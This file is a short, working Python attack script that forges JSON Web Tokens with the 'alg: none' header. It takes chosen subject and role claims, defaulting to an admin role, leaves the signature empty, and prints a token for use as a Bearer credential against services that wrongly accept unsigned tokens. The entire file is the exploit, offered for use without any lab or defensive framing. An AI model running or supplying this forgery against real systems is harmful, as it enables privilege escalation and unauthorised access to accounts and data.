#!/usr/bin/env python3
"""
jwt_forge.py - forges an admin JWT by exploiting an alg:none acceptance bug.

Usage:
    python3 jwt_forge.py --sub operator --role admin

Prints a forged token you can use as:
    Authorization: Bearer <token>
"""
import argparse
import base64
import json
import time


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_token(sub: str, role: str) -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": sub, "role": role, "iat": int(time.time())}
    header_b64 = b64url(json.dumps(header).encode())
    payload_b64 = b64url(json.dumps(payload).encode())
    # Signature segment is left empty - that's the whole point of alg:none
    return f"{header_b64}.{payload_b64}."


def main():
    parser = argparse.ArgumentParser(description="Forge a JWT via alg:none")
    parser.add_argument("--sub", default="operator", help="subject/username claim")
    parser.add_argument("--role", default="admin", help="role claim to forge")
    args = parser.parse_args()

    token = forge_token(args.sub, args.role)
    print(token)


if __name__ == "__main__":
    main()
